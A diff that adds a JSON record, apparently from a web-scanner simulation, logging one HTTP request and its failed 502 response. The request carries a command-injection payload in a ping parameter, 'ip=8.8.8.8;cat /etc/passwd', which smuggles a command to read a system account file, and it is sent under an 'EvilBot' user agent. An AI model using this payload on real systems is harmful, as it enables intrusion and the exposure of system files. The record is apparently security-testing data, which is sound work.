@@ -1,0 +1,15 @@
+{
+  "request": {
+    "url": "engine_simulation",
+    "full_http_request": "GET /api/ping?ip=8.8.8.8;cat /etc/passwd HTTP/1.1\nHost:  www.testfire.com \nUser-Agent: EvilBot/1.0\nConnection: keep-alive"
+  },
+  "response": {
+    "statusCode": 200,
+    "httpResponseContent": "HTTP/1.1 502 Bad Gateway\r\n\r\nConnection Failed: [Errno 11002] getaddrinfo failed"
+  },
+  "meta": {
+    "isPipeline": false
+  },
+  "recordId": "01fad26dbf8f41418fb6a98ed0e8eb34",
+  "timestamp": "2026-01-06 20:06:38"
+}
